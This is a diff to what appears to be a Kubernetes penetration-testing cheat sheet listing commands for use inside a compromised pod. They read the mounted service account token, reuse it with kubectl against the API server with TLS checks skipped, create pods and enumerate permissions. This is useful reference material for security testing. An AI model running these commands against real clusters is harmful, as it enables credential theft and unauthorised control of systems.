@@ -43,18 +43,21 @@ _/ ___\ |  |  \ _/ __ \ \__  \ \   __\     /  ___/|  |  \ _/ __ \_/ __ \\   __\
 
 - curl localhost:8080
    - ( from inside a nodeJS pod, we query the nodeJS server )
+   - ( when inside a pod, containers are accessible as ports )
    
 - cat /var/run/secrets/kubernetes.io/serviceaccount/token
    - ( view service account token! )
    
-- kubectl --insecure-skip-tls-verify -shttps://[IP]:PORT/ --token="[TOKEN]" -n kube-system get pods 
+- kubectl --insecure-skip-tls-verify -shttps://[IP]:PORT/ --token="[TOKEN]" -n [NAMESPACE] [COMMAND]
    - ( RCE with compromised SA token )
    
-- kubectl create [POD-MANIFEST].yml
-
+- kubectl create -f [POD-MANIFEST].yml
+   - ( create pod from pod manifest )
+   
 - kubectl logs [POD]
 
 - kubectl auth can-i --list
+   ( check what you can do with a compromised service account token )
 
 - cat /proc/self/cgroup
    - ( answers the question 'Am I in a container?' )
